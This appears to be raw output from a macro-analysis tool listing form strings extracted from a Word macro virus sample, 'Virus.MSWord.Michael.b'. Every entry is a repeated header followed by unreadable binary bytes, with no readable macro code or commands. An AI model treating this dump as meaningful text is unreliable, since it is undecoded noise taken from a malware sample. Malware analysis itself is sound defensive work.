-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������=&$=% >'#@*&<'"A,%D-(G0+I2,P61R91T80Q6/N4-J/*R5-^<4fF<lNEqTIoRGlPFjND\NLL8-,"*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+E"1O'<\)<a+Bd'<a!.P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+H$5T%6X+<_4Kt=Y�Cd�Gf�Il�Lr�Mr�U|�_��[��U�Mu�Ba�8W{*Bg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DKn`p�'':��ƫ�����d��Ny�dklgVCRG:<1'M>1sfU��|� �ٳ�ׯ�ܷ�ܶ;$!9# :&"D+(B+'E/(K3,K4-L2,R70P6-K2)L3(E+%C+$I-)V9/`A7gH<mQCjQBfI?cJ?`MCA.-JCN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*F!0M$5X+?c)<a!1R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/S'=h1It6Nw9X:S�Di�Hj�Ov�Z��]��Q{�Pu�>[0Km"9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
31.k�ɓ��93:�߻������DZnE=H_[]��w����ĩ�ү�׶�ִ�ְ�ǟ�Ü�ү�ˮ;"!4"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<'#B+%H2)O4-M4,L3+N0)H/%G+!B*"@'"?'!E+#P1(S6/[?4fK?dG:_D7`B;`E:P93y|�&.P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+D!/N$8X'7[$4S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)O-Dn7Q|:T�:V>\�?]�:VCe�Nu�Q~�Y��Ty�Im�8V{(;Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FHR{�Ў��O6-|y^qva��s��|�������̲�Է�ظ�Ӵ�Ѱ�έ�Ğ�������Χ�6#!3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=&#G3*M5,P7-I.)E*#?(!A' @$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>%!@( B*$M3*R80W:2]?5`C8[?5Z>6]C8dJ:oksWe�%&+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/K!1N#3R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,M1IqE_�Jf�F_�>[�7Uz9X�<Z�;X�Ac�O|�X��S{�Dh�2Pv 1N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*9f@_����`RB��p��z��y�������̯�ټ�Ե�Դ�д�б�ʬ���������������6 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@+#H.(H.'C+$?&#=& >&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A) K.%K4)Q6+W:/[=1Y=2X=4Y@7^E9ncXDQ�((2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$?#3Q*>b.Cg.Cg5Mn7Ps0Kl4Ov9[~6S>\�Ej�W��V~�Bk�2Qs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.I�c�������y��t��s��|����������ն�ϰ�ʮ�Ү�Ω�á�����y��w��~��r5!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9(!?*">($>&"@( :%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E)"H3)N2'Q8,W:/U8/W;1Y?3^F9iSDMW�,+J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,A':V.Dh.Ij5Q{7W�Bi�Nt�Vz�Bc�/Ns
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d~��ǿzu`��~��u��o��u��}�������ĩ�Ƨ�ɩ�ƣ��������r��k��i��g�}_1 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9& =&!<%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<% F0(I0'K0&N2(R6+R6-U:/T</YC4^H6wotKMm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*B"5U(@f1Mw;c�Gk�Lo�<c�/Kn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Pp���������}��p��l��l��n��{��������������������u��i��d�~b�{`~sX3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9&!;&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D*#K0%L1(L3(P3*Q:-O9,T>0ZB3\L<=Id
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)@ -H .O&;a)<`(>_-Ee0Eh4Il1Ip&7W0JnEk�Gi�Bh�.Hn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AD]����������o��h��f��h��o��w��������������u��l��g�~`�z]�z^sU0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E+$H/&H0'M3)P9+K6*Q9+U>0WB37.=	

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.I$7Y(@c.Gs7Y�;\�7Q|<a�=_�@`�<\�9R�+>^6S~Bj�:`�*Gm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 1�����������{��o��f�}a��b��g��l��w��z��~��u��l��g��d�{a�z^�z]�sV-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B) E)!G.#J1&I3'M7+N6+W>-L:1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(F!-M*>_'<c*@m5N�@\�A_�Ek�Km�@a�?a�?b�8X�*=a:W�;`�)Hm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

				

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
):ppa��~��x��n��s��k��e�}b�v_�~b��g��o��m��q��f�|a~y[{t[�v[|pV}lTvdK(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?) @)!B*"C/!F0&H4(O8*Q</L<4EJd21V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+M$4[*Am7P�C`�E^�Nk�Ml�Gh�6W�<[�:[�4Nv'9`6Z,Hn	

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/JSgsuk�}^��c��e��g��k��g��d~a}y^zu\~yc�l}�e�m~|azwayy^xoTukRsfMk_ElZC*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<& >'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A*#@-#C0$F-#F2&L5)J9.N@5YPPBGh'6b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,S"3\,Bo<V�Ie�Rk�Su�Km�=Z�6S�<R�6S�6Q.En,Ab)Fk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+1DCNpfeeumWqjTqjN}oYxZ~uY�w^�w]�{a��d�e|d~|c~~j}i��i{zczu^xu[ujRmaIl\GfW?`P:*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B,!B+$C-#E-&D.%E0'F2)G6*D5*E9/C><
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(N!0V$3Z%3Z)6e/Bo6H}@X�6N}>\�:W�9S�9V�;V�4Lx)@g(?c>CGplatjSvmTtiNrgLneKpcJoeKrbMteR|lT~rY|`�}e��i��k��m|zf|wbws\piWslVphQf\GaQ?bR=`O:*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>(!=(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>,!B."@.!@-#C/'D1'@3(@5*4/*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(H 1V"/X!/T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$W")_"'\+:k?[�Da�@]�Df�;\�6L},Eo*@b]YOrfMuiMtfOpfMsgNocIhYBeYAfV@jYHtbJsjNymSzqX}y_~d�{eut_woYumVjgPpfPrdOj^F`U=[K:XI5'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=) <+#A0%A3(B6*,((
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(L"2V&5]&7]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 G #M#%\DG�LR�DG�EK�;?�1>}=V�Hh�Im�Ef�:W�1Is+Go5?XpePugNp_KnaIlbHi_EfT@_Q;ZK7[K;bO<iZEkaKpaKrkTyqXwt_snYmfQqjVhdRpbNm`Kk]FdUBXF5O=-&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<-!;%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:) 8) <)"<-$A1&?1(!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.O"2U#3S%4[)1[$(T%)[3<�SV�ab�XY�X`�OS�=C�AN�E_�Hk�De�Ba�5U�1Jt/JnJJMpeMq_KfYDf]EeZ@cT<\O<TJ8RB5XG6_N=^P<^P=fYDmaMngUnfSpeTjbOnbOnbMjZIcTA^N:M<,F5&'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9& 9*";*$=.'6,'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3')V&'a25�IS�>A�8=�8>�7<�:@�69pJX�<]�Ej�Do�9]�6Q}8R}0Dd_WGl]HbW?bV?`Q<^N:YK:UE4P?2QA2SB3RD4SD5WH:XL<^UD`XJe_Pd\KgWFh\GbTBaQBSA1B1&;+ $
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;' =(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8' 8+"=-%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+N /V%6`$5]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:,5QU`xR^yn{�^j~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D +V;Z�Ms�Gm�Hm�>[�<Y�8Sx6=OYF8XJ7YI8\L4WK9WL8RB2O?0O=.J=.K=.L>/H;-I=/I?3QF8SJ>UJ<UL;XJ:XH8�z^i\G?/"9)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5)!2&"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.T$7a-Ao0Bm)7V.:^.@l *X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K $T!&b&)^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#W"-e;N�Ki�Ov�V}�Ot�Fp�A_�>]�:T�4JoN=4RD4TE2PC1RC2QB2M?.I8,K9,H7+C3'A4)=1(<2'A4*E90B80C6+H:.M=1N=-D3'?.";)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2'"6)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(H!1U$:e,?m0Gw:O4Em@Pp@W}7O�0@z2B�@Q�H^�P_�JX�Tg�Nj�Vq�]�Z|�X��R|�Kx�Ho�De�=^�5Qv:7=P@4QC1N;.Q>0P?.M;-H7+J7,B6);0%;-#5+"7+";.%=1(?1)7,$;1&A2)D4&>-";( 9'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7'#6(#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%C (G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.P&;d+An4Q7Q�AU�@V�CX�Jd�AZ�0Fy:W�Rm�B_�Lg�X|�Po�\|�_}�c��^��^��]��Y��Sv�Hn�Bb�9S}-;XJ90J;/J9-P=1P@/K;0F6.C2(=.&9,$6(!2&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3)#5+#5($7-$7) 9+%G:-B1'9(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7(#/%#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'E"-N(7Z,Cm6O}>[�Ge�D\�J_�F^�D_�?^�9R|>\�g��Qk�\�Sv�\~�`��j��e��_��`��j��g��X��Qv�Fh�;W�.AgG7/I7-F6*M;-N;/G9.?.&<)"6' 7(!1%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/$ .%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0$ 4("2&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5) 5&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3& 7*#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,J#/T':]1GpAX�Fe�Nj�Je�G`�H^�>X�<M|6Hy@Y�b�Qi�f��[~�e��d��j��b��d��m��o��j��_��Y��Nt�@e�3Ju;56C3*B0&G4'F4+>2$3%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*N$3X,Ag3Kw>Z�Hf�Kg�@X�7Iy0;m#-Z,5h;B{LY�N\�EV�h�c|�CQ�I^�]~�e��l��m��l��n��b��\��T|�Ae�9Q,2I?0):*">,$<-#5$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
